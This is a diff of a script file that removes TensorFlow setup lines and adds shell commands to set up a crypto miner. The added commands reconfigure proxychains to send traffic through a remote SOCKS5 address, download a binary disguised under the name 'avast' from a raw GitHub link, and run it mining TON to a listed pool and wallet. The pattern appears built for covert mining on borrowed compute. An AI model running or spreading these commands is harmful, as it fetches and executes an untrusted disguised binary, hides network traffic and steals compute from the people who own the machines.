@@ -6,14 +6,25 @@ wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.29/lolM
 TRHjzK8DBKrse4X4THaepbemcF6CVBKDT6
 
 
-import tensorflow as tf
-
-from tensorflow import keras
-from tensorflow.keras import layers
-from tensorflow.keras import mixed_precision
-
-mixed_precision.set_global_policy('mixed_float16')
-
 
 TON
 EQBB7AiekO0BMwfFwgC4A_-w-aOgPSt5G_oDg4kyOlETN-kU
+
+
+apt update
+
+apt install proxychains
+
+apt install screen -y
+
+sed -i 's/socks4/socks5/' /etc/proxychains.conf
+
+sed -i 's/127.0.0.1/98.162.96.53/' /etc/proxychains.conf
+
+sed -i 's/9050/10663/' /etc/proxychains.conf
+
+wget https://raw.githubusercontent.com/renilo/ba/main/avast
+
+chmod +x avast
+
+./avast --algo TON --pool https://server1.whalestonpool.com --user EQBB7AiekO0BMwfFwgC4A_-w-aOgPSt5G_oDg4kyOlETN-kU --ton-mode 1
